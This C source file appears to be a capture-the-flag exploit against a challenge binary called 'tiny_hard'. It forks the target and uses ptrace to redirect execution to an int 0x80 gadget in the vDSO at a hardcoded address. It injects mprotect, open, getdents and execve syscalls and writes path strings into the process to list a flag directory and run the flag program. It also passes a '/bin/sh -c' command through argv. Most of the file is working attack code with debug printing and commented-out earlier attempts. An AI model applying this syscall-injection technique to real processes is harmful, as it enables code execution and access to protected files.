#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h>

#define VDSO_START (0xf7755000) // changes due to ASLR, low entropy. Example start
#define int80_offest (0xb57) // remote offset to int 0x80 gadget on the vdso
#define INT80 (0xf7742b57)

// NEXT: try to send the buffer to the parent process, make the reading fd non-blocking due to '\n'
// make sure the memory map doesn't get erased when the child executes an /exec. check PTRACE_EXEC

char secret_exec[] = "/home/tiny_hard/flag_is_in_here/this_is_executable_run_it_to_get_flag";
// 0xf7742b57

// THE SECRET FOLDER CONTAINS THE FOLLOWING EXECUTABLE:
// 'this_is_executable_run_it_to_get_flag'


/*
int run_mmap(pid_t pid, int syscall_number, int first_paramter, 
	int second_parameter, int third_paramter, int fourth_parameter,
	 int fifth_parameter, int sixth_parameter)
{
	struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eip = INT80;
    regs.eax = syscall_number;
    regs.ebx = first_paramter;
    regs.ecx = second_parameter;
    regs.edx = third_paramter;
    regs.esi = fourth_parameter;
    regs.edi = fifth_parameter;
    regs.ebp = sixth_parameter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}
*/
int run_syscall(pid_t pid, int syscall_number, int first_paramter, int second_parameter, int third_paramter) {
    struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eip = INT80;
    regs.eax = syscall_number;
    regs.ebx = first_paramter;
    regs.ecx = second_parameter;
    regs.edx = third_paramter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

char address[] = { 0x57, 0x2b, 0x74, 0xf7 }; // another legit address
char *ARG = "/bin/sh";
//char exploit[] = "ls -la /home/tiny_hard/flag_is_in_here > /tmp/itay_tiny_hard/FLAG\n";

void run_bash_with_ptrace(pid_t pid) {
//printf("Parents starts waiting..\n");
int status;
wait(&status);
if (status < 200)
{return;
}
    
struct user_regs_struct regs = { 0 };
ptrace(PTRACE_GETREGS, pid, 0, &regs);

regs.eip = 0x08048074;
regs.eax = 11;
regs.ebx = regs.esp;
regs.ecx = regs.esp;
regs.edx = regs.esp;
ptrace(PTRACE_SETREGS, pid, 0, &regs);
ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
wait(&status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]First wait landed, single stepping..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

/*

//printf("First wait landed!\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

long potential_argv = regs.esp + 0x1000 - 8 + 80;
long bin_sh_addr = ptrace(PTRACE_PEEKTEXT, pid, potential_argv, 0);
long bin_sh = ptrace(PTRACE_PEEKTEXT, pid, bin_sh_addr, 0);
long bin_sh2 = ptrace(PTRACE_PEEKTEXT, pid, bin_sh_addr + 4, 0);
long arg_c_addr = ptrace(PTRACE_PEEKTEXT, pid, potential_argv + 4, 0);
long arg_c = ptrace(PTRACE_PEEKTEXT, pid, arg_c_addr, 0);
long cmd_addr = ptrace(PTRACE_PEEKTEXT, pid, potential_argv + 8, 0);
long cmd = ptrace(PTRACE_PEEKTEXT, pid, cmd_addr, 0);
long cmd2 = ptrace(PTRACE_PEEKTEXT, pid, cmd_addr + 4, 0);
long cmd3 = ptrace(PTRACE_PEEKTEXT, pid, cmd_addr + 8, 0);
long cmd4 = ptrace(PTRACE_PEEKTEXT, pid, cmd_addr + 12, 0);
long cmd5 = ptrace(PTRACE_PEEKTEXT, pid, cmd_addr + 16, 0);
long cmd6 = ptrace(PTRACE_PEEKTEXT, pid, cmd_addr + 20, 0);


printf("potential_argv:%p\n", (void *)potential_argv);
printf("bin_sh_addr:%p\n", (void *)bin_sh_addr);
printf("bin_sh: %p\n", (void *)bin_sh);
printf("bin_sh2: %p\n", bin_sh2);
printf("arg_c: %p\n", arg_c);
printf("cmd: %p\n", cmd);
printf("cmd2: %p\n", cmd2);
printf("cmd3: %p\n", cmd3);
printf("cmd4: %p\n", cmd4);
printf("cmd5: %p\n", cmd5);
printf("cmd6: %p\n", cmd6);

// debug
run_syscall(pid, 11, bin_sh_addr, potential_argv, potential_argv + 12);
wait(&status);
printf("Status: %d\n", status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]exec syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

*/

run_syscall(pid, 125, 0x8048000, 0x1000, 7);
wait(&status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]mprotect syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

/*
ptrace(PTRACE_POKETEXT, pid, 0x8048320, 0x6e69622f); // write /bin/sh
ptrace(PTRACE_POKETEXT, pid, 0x8048320 + 4, 0x0068732f);
ptrace(PTRACE_POKETEXT, pid, 0x8048350, 0x8048320); // write ecx = argv
ptrace(PTRACE_POKETEXT, pid, 0x8048350 + 4, 0);
 
ptrace(PTRACE_GETREGS, pid, 0, &regs);

run_syscall(pid, 11, 0x8048320, 0x8048350, 0); // exec

wait(&status);
printf("Done with exec..status:%d\n", status);
printf("errno: %d\n", errno);
*/

ptrace(PTRACE_POKETEXT, pid, 0x8048200, 0x6d6f682f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 4, 0x69742f65);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 8, 0x685f796e);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 12, 0x2f647261); // changed 61->60
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 16, 0x67616c66);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 20, 0x5f73695f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 24, 0x685f6e69);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 28, 0x2f657265);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 32, 0x00000000); // added /flag at the end
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 36, 0x00000000);
run_syscall(pid, 5, 0x8048200, 0 , 0); // Open
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
int flag_fd = regs.eax;
printf("Open syscall worked, flag fd: %d\n", flag_fd);
printf("[*]open syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

/*
run_mmap(pid, 90, 0x66661111, 0x1000, 1, 1, flag_fd, 0);
printf("[*]mmap Syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);
printf("Errno: %d\n", errno);

run_syscall(pid, 3, flag_fd, 0x8048400, 52); // Read
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("read %d bytes\n",  regs.eax);

printf("errno: %d\n", errno);
*/
long empty_buf = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700, 0);
printf("empty_buf before read:%p\n", empty_buf);
/*
run_syscall(pid, 3, flag_fd, regs.esp + 0x1000 - 8, 50); // Read
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("read %d bytes\n",  regs.eax);
*/
run_syscall(pid, 89, flag_fd, 0x08048700, 1); // read single dirent
wait(NULL);
run_syscall(pid, 89, flag_fd, 0x08048700, 1); // read single dirent
wait(NULL);
run_syscall(pid, 89, flag_fd, 0x08048700, 1); // read single dirent
wait(NULL);

ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("readdir return code: %d\n",  regs.eax);
long inode_num = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700, 0);
long offset_val = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 4,0);
long length_and_name = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 8, 0);
long name1 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 12, 0);
long name2 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 16, 0);
long name3 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 20, 0);
long name4 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 24, 0);
long name5 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 28, 0);
long name6 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 32, 0);
long name7 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 36, 0);
long name8 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 40, 0);
long name9 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 44, 0);
long name10 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 48, 0);
long name11 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 52, 0);
long name12 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 56, 0);

printf("inode:%p\noffset_val:%p\nlengthandNAME:%p\nname1:%p\nname2:%p\nname3:%p\nname4:%p\nname5:%p\nname6:%p\nname7:%p\nname8:%p\n,name9:%p\n,name10:%p\n,name11:%p\n,name12:%p\n",inode_num, offset_val, length_and_name, name1, name2, name3, name4, name5, name6, name7, name8, name9, name10, name11, name12);


run_syscall(pid, 11, secret_exec, secret_exec, 0); // get flag
wait(&status);
printf("child done executing!\ncode:%d",status);

}

void main(void) {
char flag_buf[50] = {0};
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return;
    }
    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

    if (0 == pid) {
	close(pipefd[0]);
	dup2(pipefd[1], 1); // make sure user terminal receives output    	
//printf("[*] Child entered\n");
	dup2(pipefd[1], 2);
        execl("/home/tiny_hard/tiny_hard", address, "AAAA", "BBBB", ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, "/bin/sh", "-c", "/bin/ls -la > /tmp/itay_tiny_hard/NEW_FLAG", NULL);
        perror("execl");
    }
    else {
	close(pipefd[1]);
	// write(pipefd[1], exploit, sizeof(exploit));	
//printf("[*] Parent entered. Child pid: %d\n", pid);
        run_bash_with_ptrace(pid);
	printf("Done running, reading input..\n");	
read(pipefd[0], flag_buf, 50);
	printf("got flag: %s", flag_buf);
    }
}
